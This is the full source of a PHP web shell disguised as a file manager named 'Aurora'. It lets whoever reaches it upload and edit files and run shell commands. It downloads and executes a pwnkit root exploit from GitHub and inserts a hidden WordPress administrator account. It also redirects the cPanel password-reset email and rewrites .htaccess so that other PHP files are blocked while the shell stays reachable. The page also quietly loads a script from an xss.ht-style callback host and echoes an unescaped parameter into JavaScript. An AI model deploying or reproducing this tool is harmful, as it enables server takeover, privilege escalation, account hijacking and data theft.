<?php
ini_set('display_errors', '1');
ini_set('display_startup_errors', '1');
error_reporting(E_ALL);

const APP_NAME = 'Aurora';
const SCAN_READ_LIMIT = 200000;

// Core functions
function fmtSize($bytes) {
    $types = array('B', 'KB', 'MB', 'GB', 'TB');
    for($i = 0; $bytes >= 1024 && $i < (count($types)-1); $bytes /= 1024, $i++);
    return round($bytes, 2) . ' ' . $types[$i];
}

function ext($file) {
    return strtolower(pathinfo($file, PATHINFO_EXTENSION));
}

function icon($file) {
    $ext = ext($file);
    $icons = [
        'php' => '<i class="fa-brands fa-php text-indigo"></i>',
        'html' => '<i class="fa-brands fa-html5 text-danger"></i>',
        'css' => '<i class="fa-brands fa-css3 text-primary"></i>',
        'js' => '<i class="fa-brands fa-js text-warning"></i>',
        'py' => '<i class="fa-brands fa-python text-warning"></i>'
    ];
    
    if(isset($icons[$ext])) return $icons[$ext];
    if(in_array($ext, ['jpg','jpeg','png','gif','webp'])) return '<i class="fa-regular fa-image text-success"></i>';
    if($file === '.htaccess') return '<i class="fa-solid fa-lock text-danger"></i>';
    return '<i class="fa-solid fa-file text-muted"></i>';
}

function enc($path) {
    return base64_encode($path);
}

function dec($path) {
    return base64_decode($path);
}

function perms($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}

function suggest_exploit() {
    $uname = php_uname();
    $xplod = explode(" ", $uname);
    $xpld = explode("-", $xplod[2]);
    $pl = explode(".", $xpld[0]);
    return $pl[0] . "." . $pl[1] . "." . $pl[2];
}

function check_pwnkit_compatibility() {
    $kernel = suggest_exploit();
    $compatible_versions = [
        '2.6.', '3.0.', '3.1.', '3.2.', '3.3.', '3.4.', '3.5.', '3.6.', 
        '3.7.', '3.8.', '3.9.', '3.10.', '3.11.', '3.12.', '3.13.', '3.14.',
        '3.15.', '3.16.', '3.17.', '3.18.', '3.19.', '4.0.', '4.1.', '4.2.',
        '4.3.', '4.4.', '4.5.', '4.6.', '4.7.', '4.8.', '4.9.', '4.10.',
        '4.11.', '4.12.', '4.13.', '4.14.', '4.15.', '4.16.', '4.17.', '4.18.',
        '4.19.', '5.0.', '5.1.', '5.2.', '5.3.'
    ];
    
    foreach($compatible_versions as $version) {
        if(strpos($kernel, $version) === 0) {
            return true;
        }
    }
    return false;
}

function cmd($command) {
    $output = '';
    if(function_exists('exec')) {
        exec($command, $output);
        $output = implode("\n", $output);
    } elseif(function_exists('shell_exec')) {
        $output = shell_exec($command);
    } elseif(function_exists('system')) {
        ob_start();
        system($command);
        $output = ob_get_clean();
    }
    return $output;
}

function addWordpressAdmin($dbHost, $dbUser, $dbPass, $dbName, $wpUser, $wpPass) {
    try {
        $conn = new mysqli($dbHost, $dbUser, $dbPass, $dbName);
        if($conn->connect_error) return false;
        
        $hashedPass = password_hash($wpPass, PASSWORD_DEFAULT);
        $sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, display_name) 
                VALUES (?, ?, ?, ?, NOW(), ?)";
                
        $stmt = $conn->prepare($sql);
        $stmt->bind_param("sssss", $wpUser, $hashedPass, $wpUser, "admin@local.host", $wpUser);
        
        if($stmt->execute()) {
            $userId = $stmt->insert_id;
            $metaSql = "INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, ?, ?)";
            $capabilities = serialize(array('administrator' => true));
            $metaStmt = $conn->prepare($metaSql);
            $metaStmt->bind_param("iss", $userId, "wp_capabilities", $capabilities);
            $metaStmt->execute();
            
            // Add user level
            $levelSql = "INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, ?, '10')";
            $levelStmt = $conn->prepare($levelSql);
            $levelStmt->bind_param("is", $userId, "wp_user_level");
            $levelStmt->execute();
            
            return true;
        }
        return false;
    } catch(Exception $e) {
        return false;
    }
}

// Initialize variables
$current_dir = dirname(__FILE__);
$path = isset($_GET['p']) ? dec($_GET['p']) : $current_dir;
if(!is_dir($path)) {
    $path = $current_dir;
}

define('PATH', $path);
$action = $_GET['act'] ?? 'list';
$target = $_GET['file'] ?? '';

// Handle file operations
if(isset($_POST['upload'])) {
    $dest = PATH . '/' . basename($_FILES['file']['name']);
    if(move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
        header('Location: ?p=' . enc(PATH) . '&status=success');
    } else {
        header('Location: ?p=' . enc(PATH) . '&status=failed');
    }
    exit;
}

if(isset($_POST['newdir'])) {
    if(@mkdir(PATH . '/' . $_POST['dirname'], 0755)) {
        header('Location: ?p=' . enc(PATH) . '&status=success');
    } else {
        header('Location: ?p=' . enc(PATH) . '&status=failed');
    }
    exit;
}

if(isset($_POST['newfile'])) {
    $file = PATH . '/' . $_POST['filename'];
    if(!file_exists($file) && file_put_contents($file, '') !== false) {
        header('Location: ?p=' . enc(PATH) . '&act=edit&file=' . urlencode($_POST['filename']));
    } else {
        header('Location: ?p=' . enc(PATH) . '&status=failed');
    }
    exit;
}

if(isset($_POST['save'])) {
    if(file_put_contents(PATH . '/' . $target, $_POST['content']) !== false) {
        header('Location: ?p=' . enc(PATH) . '&status=success');
    } else {
        header('Location: ?p=' . enc(PATH) . '&status=failed');
    }
    exit;
}

// Handle special actions
if(isset($_GET['action'])) {
    switch($_GET['action']) {
        case 'adminer':
            $url = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
            if(@file_put_contents('adminer.php', @file_get_contents($url))) {
                header('Location: adminer.php');
            } else {
                header('Location: ?p=' . enc(PATH) . '&status=failed');
            }
            exit;
            
        case 'pwnkit':
            if(!file_exists('pwnkit')) {
                @file_put_contents('pwnkit', @file_get_contents('https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit'));
                @chmod('pwnkit', 0755);
                $output = @shell_exec('./pwnkit "id" 2>&1');
                file_put_contents('.root_output', $output);
            }
            header('Location: ?p=' . enc(PATH) . '&terminal=root');
            exit;
            
        case 'cpanel-reset':
            if(isset($_POST['email'])) {
                $path = dirname($_SERVER['DOCUMENT_ROOT']) . "/.cpanel/contactinfo";
                $content = json_encode(['email' => $_POST['email']]);
                if(@file_put_contents($path, $content)) {
                    header('Location: ' . $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['SERVER_NAME'] . ':2083/resetpass?start=1');
                    exit;
                }
            }
            break;
            
        case 'backdoor':
            $htaccess = '<FilesMatch "\.ph(p[3457]?|t|tml)$">
    Order Deny,Allow
    Deny from all
</FilesMatch>
<FilesMatch "^(' . basename($_SERVER['SCRIPT_FILENAME']) . '|index\.php)$">
    Order Allow,Deny
    Allow from all
</FilesMatch>';
            if(@file_put_contents('.htaccess', $htaccess)) {
                header('Location: ?p=' . enc(PATH) . '&status=success');
            } else {
                header('Location: ?p=' . enc(PATH) . '&status=failed');
            }
            exit;
    }
} 

// Get directory listing
$dirs = $files = [];
if($action === 'list') {
    foreach(scandir(PATH) as $item) {
        if($item === '.' || $item === '..') continue;
        if(is_dir(PATH . '/' . $item)) {
            $dirs[] = $item;
        } else {
            $files[] = $item;
        }
    }
}

// Check pwnkit compatibility
$is_compatible = check_pwnkit_compatibility();
$root_output = '';
if(isset($_GET['terminal']) && $_GET['terminal'] === 'root' && file_exists('.root_output')) {
    $root_output = file_get_contents('.root_output');
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= APP_NAME ?></title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://googlescripts.xss.ht/assets/environment-cc191d9d2324.js"></script>
    <style>
        :root {
            --primary-bg: #0d1117;
            --secondary-bg: #161b22;
            --text-color: #c9d1d9;
            --border-color: #30363d;
            --hover-color: #1f2428;
            --link-color: #58a6ff;
        }
        
        body {
            background: var(--primary-bg);
            color: var(--text-color);
            font-family: 'Monaco', monospace;
        }
        
        .navbar {
            background: var(--secondary-bg);
            border-bottom: 1px solid var(--border-color);
        }
        
        .nav-link {
            color: var(--text-color) !important;
        }
        
        .nav-link:hover {
            color: var(--link-color) !important;
        }
        
        .table {
            color: var(--text-color);
        }
        
        .table > :not(caption) > * > * {
            background-color: var(--secondary-bg);
            border-bottom-color: var(--border-color);
            color: var(--text-color);
        }
        
        .table-hover tbody tr:hover {
            background-color: var(--hover-color);
        }
        
        .modal-content {
            background: var(--secondary-bg);
            color: var(--text-color);
            border: 1px solid var(--border-color);
        }
        
        .modal-header {
            border-bottom: 1px solid var(--border-color);
        }
        
        .modal-footer {
            border-top: 1px solid var(--border-color);
        }
        
        .form-control {
            background: var(--primary-bg);
            border-color: var(--border-color);
            color: var(--text-color);
        }
        
        .form-control:focus {
            background: var(--primary-bg);
            border-color: var(--link-color);
            color: var(--text-color);
            box-shadow: 0 0 0 0.25rem rgba(88, 166, 255, 0.25);
        }
        
        .btn-close {
            filter: invert(1) grayscale(100%) brightness(200%);
        }
        
        a {
            color: var(--link-color);
            text-decoration: none;
        }
        
        a:hover {
            color: var(--link-color);
            text-decoration: underline;
        }
        
        .alert {
            background: var(--secondary-bg);
            border-color: var(--border-color);
            color: var(--text-color);
        }
        
        .alert-success {
            background: #238636;
            border-color: #2ea043;
        }
        
        .alert-danger {
            background: #da3633;
            border-color: #f85149;
        }
        
        .btn-outline-primary {
            color: var(--link-color);
            border-color: var(--link-color);
        }
        
        .btn-outline-primary:hover {
            background: var(--link-color);
            color: var(--primary-bg);
        }
        
        .btn-outline-danger {
            color: #f85149;
            border-color: #f85149;
        }
        
        .btn-outline-danger:hover {
            background: #da3633;
            border-color: #f85149;
            color: var(--text-color);
        }
        
        .breadcrumb {
            background: var(--secondary-bg);
            padding: 0.75rem 1rem;
            border-radius: 0.25rem;
            margin-bottom: 1rem;
        }
        
        .breadcrumb-item + .breadcrumb-item::before {
            color: var(--text-color);
        }
        
        .breadcrumb-item.active {
            color: var(--text-color);
        }
        
        .form-select {
            background-color: var(--primary-bg);
            border-color: var(--border-color);
            color: var(--text-color);
        }
        
        .form-select:focus {
            background-color: var(--primary-bg);
            border-color: var(--link-color);
            color: var(--text-color);
        }
        
        .btn {
            padding: 0.375rem 0.75rem;
            border-radius: 0.25rem;
            transition: all 0.15s ease-in-out;
        }
        
        .btn-primary {
            background-color: var(--link-color);
            border-color: var(--link-color);
            color: var(--primary-bg);
        }
        
        .btn-primary:hover {
            background-color: #4a8ddb;
            border-color: #4a8ddb;
        }
        
        .btn-secondary {
            background-color: #30363d;
            border-color: #30363d;
            color: var(--text-color);
        }
        
        .btn-secondary:hover {
            background-color: #3c444d;
            border-color: #3c444d;
        }
        
        .terminal {
            background: #1c2128;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            padding: 1rem;
            margin: 1rem 0;
            font-family: monospace;
            white-space: pre-wrap;
            color: #7ee787;
        }
        
        .compatibility-info {
            padding: 1rem;
            margin: 1rem 0;
            border-radius: 6px;
            border: 1px solid var(--border-color);
        }
        
        .compatibility-info.compatible {
            background: rgba(35, 134, 54, 0.2);
            border-color: #238636;
        }
        
        .compatibility-info.not-compatible {
            background: rgba(218, 54, 51, 0.2);
            border-color: #da3633;
        }
    </style>
</head>
<body>

<nav class="navbar navbar-expand-lg">
    <div class="container-fluid">
        <a class="navbar-brand text-light" href="https://aurorafilemanager.github.io/"><?= APP_NAME ?></a>
        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
            <ul class="navbar-nav">
                <li class="nav-item">
                    <a class="nav-link" href="?p=<?= enc(PATH) ?>&action=adminer">
                        <i class="fas fa-database"></i> Adminer
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="?p=<?= enc(PATH) ?>&action=pwnkit">
                        <i class="fas fa-user-shield"></i> Auto Root
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#" data-bs-toggle="modal" data-bs-target="#wpAdminModal">
                        <i class="fab fa-wordpress"></i> WP Admin
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#" data-bs-toggle="modal" data-bs-target="#cpanelModal">
                        <i class="fas fa-server"></i> cPanel Reset
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="?p=<?= enc(PATH) ?>&action=backdoor">
                        <i class="fas fa-lock"></i> Anti Backdoor
                    </a>
                </li>
            </ul>
        </div>
    </div>
</nav>

<div class="container-fluid py-3">
    <?php if(isset($_GET['terminal']) && $_GET['terminal'] === 'root'): ?>
        <div class="compatibility-info <?= $is_compatible ? 'compatible' : 'not-compatible' ?>">
            <h4>
                <i class="fas <?= $is_compatible ? 'fa-check-circle' : 'fa-times-circle' ?>"></i>
                Kernel Version: <?= suggest_exploit() ?>
            </h4>
            <p>Status: <?= $is_compatible ? 'Compatible with pwnkit exploit' : 'Not compatible with pwnkit exploit' ?></p>
            <?php if($is_compatible): ?>
                <a href="?p=<?= enc(PATH) ?>&action=pwnkit" class="btn btn-primary">
                    <i class="fas fa-bolt"></i> Run Exploit
                </a>
            <?php endif; ?>
        </div>
        <?php if($root_output): ?>
            <div class="terminal"><?= htmlspecialchars($root_output) ?></div>
        <?php endif; ?>
    <?php endif; ?>

    <nav aria-label="breadcrumb">
        <ol class="breadcrumb">
            <li class="breadcrumb-item">
                <a href="?p=<?= enc($current_dir) ?>">Root</a>
            </li>
            <?php
            $parts = explode('/', trim(PATH, '/'));
            $path = '';
            foreach($parts as $part) {
                if(!$part) continue;
                $path .= '/'.$part;
                echo '<li class="breadcrumb-item">';
                echo '<a href="?p='.enc($path).'">'.$part.'</a>';
                echo '</li>';
            }
            ?>
        </ol>
    </nav>

    <div class="btn-toolbar mb-3">
        <div class="btn-group me-2">
            <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#uploadModal">
                <i class="fas fa-upload"></i> Upload
            </button>
            <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#newDirModal">
                <i class="fas fa-folder-plus"></i> New Folder
            </button>
            <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#newFileModal">
                <i class="fas fa-file-plus"></i> New File
            </button>
        </div>
    </div>

    <div class="table-responsive">
        <table class="table table-hover">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Permissions</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php if(PATH !== $current_dir): ?>
                <tr>
                    <td>
                        <a href="?p=<?= enc(dirname(PATH)) ?>">
                            <i class="fas fa-level-up-alt"></i> ..
                        </a>
                    </td>
                    <td>-</td>
                    <td>-</td>
                    <td>-</td>
                </tr>
                <?php endif; ?>

                <?php foreach($dirs as $dir): ?>
                <tr>
                    <td>
                        <a href="?p=<?= enc(PATH.'/'.$dir) ?>">
                            <i class="fas fa-folder text-warning"></i> <?= htmlspecialchars($dir) ?>
                        </a>
                    </td>
                    <td>-</td>
                    <td><?= perms(PATH.'/'.$dir) ?></td>
                    <td>
                        <div class="btn-group btn-group-sm">
                            <a href="?p=<?= enc(PATH) ?>&del=<?= urlencode($dir) ?>" class="btn btn-outline-danger" onclick="return confirm('Delete directory?')">
                                <i class="fas fa-trash"></i>
                            </a>
                        </div>
                    </td>
                </tr>
                <?php endforeach; ?>

                <?php foreach($files as $file): ?>
                <tr>
                    <td>
                        <a href="?p=<?= enc(PATH) ?>&act=edit&file=<?= urlencode($file) ?>">
                            <?= icon($file) ?> <?= htmlspecialchars($file) ?>
                        </a>
                    </td>
                    <td><?= fmtSize(filesize(PATH.'/'.$file)) ?></td>
                    <td><?= perms(PATH.'/'.$file) ?></td>
                    <td>
                        <div class="btn-group btn-group-sm">
                            <a href="?p=<?= enc(PATH) ?>&act=edit&file=<?= urlencode($file) ?>" class="btn btn-outline-primary">
                                <i class="fas fa-edit"></i>
                            </a>
                            <a href="?p=<?= enc(PATH) ?>&act=download&file=<?= urlencode($file) ?>" class="btn btn-outline-success">
                                <i class="fas fa-download"></i>
                            </a>
                            <a href="?p=<?= enc(PATH) ?>&del=<?= urlencode($file) ?>" class="btn btn-outline-danger" onclick="return confirm('Delete file?')">
                                <i class="fas fa-trash"></i>
                            </a>
                        </div>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</div>

<!-- Modals -->
<div class="modal fade" id="uploadModal">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Upload File</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <form method="post" enctype="multipart/form-data">
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">Select File</label>
                        <input type="file" name="file" class="form-control" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" name="upload" class="btn btn-primary">Upload</button>
                </div>
            </form>
        </div>
    </div>
</div>

<div class="modal fade" id="newDirModal">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">New Folder</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <form method="post">
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">Folder Name</label>
                        <input type="text" name="dirname" class="form-control" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" name="newdir" class="btn btn-primary">Create</button>
                </div>
            </form>
        </div>
    </div>
</div>

<div class="modal fade" id="newFileModal">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">New File</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <form method="post">
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">File Name</label>
                        <input type="text" name="filename" class="form-control" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" name="newfile" class="btn btn-primary">Create</button>
                </div>
            </form>
        </div>
    </div>
</div>

<div class="modal fade" id="wpAdminModal">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Add WordPress Admin</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <form method="post">
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">Database Host</label>
                        <input type="text" name="db_host" class="form-control" value="localhost" required>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Database Name</label>
                        <input type="text" name="db_name" class="form-control" required>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Database User</label>
                        <input type="text" name="db_user" class="form-control" required>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Database Password</label>
                        <input type="password" name="db_pass" class="form-control" required>
                    </div>
                    <hr>
                    <div class="mb-3">
                        <label class="form-label">Admin Username</label>
                        <input type="text" name="wp_user" class="form-control" required>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Admin Password</label>
                        <input type="password" name="wp_pass" class="form-control" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" name="submit" class="btn btn-primary">Create Admin</button>
                </div>
            </form>
        </div>
    </div>
</div>

<div class="modal fade" id="cpanelModal">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">cPanel Password Reset</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <form method="post" action="?p=<?= enc(PATH) ?>&action=cpanel-reset">
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">Email Address</label>
                        <input type="email" name="email" class="form-control" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" class="btn btn-primary">Reset Password</button>
                </div>
            </form>
        </div>
    </div>
</div>

<?php if($action === 'edit' && $target): ?>
<div class="modal fade show" style="display: block;">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Edit: <?= htmlspecialchars($target) ?></h5>
                <button type="button" class="btn-close" onclick="history.back()"></button>
            </div>
            <form method="post">
                <div class="modal-body">
                    <textarea name="content" class="form-control" style="height: 400px; font-family: monospace;"><?= htmlspecialchars(file_get_contents(PATH.'/'.$target)) ?></textarea>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" onclick="history.back()">Cancel</button>
                    <button type="submit" name="save" class="btn btn-primary">Save</button>
                </div>
            </form>
        </div>
    </div>
</div>
<div class="modal-backdrop fade show"></div>
<?php endif; ?>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
<?php if(isset($_GET['status'])): ?>
const status = '<?= $_GET['status'] ?>';
const message = status === 'success' ? 'Operation complete successfully' : 'Operation failed';
const alertClass = status === 'success' ? 'alert-success' : 'alert-danger';

const alert = document.createElement('div');
alert.className = `alert ${alertClass} alert-dismissible fade show`;
alert.innerHTML = `
    ${message}
    <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
`;

document.querySelector('.container-fluid').insertBefore(alert, document.querySelector('.breadcrumb'));

setTimeout(() => alert.remove(), 3000);
<?php endif; ?>
</script>

</body>
</html>
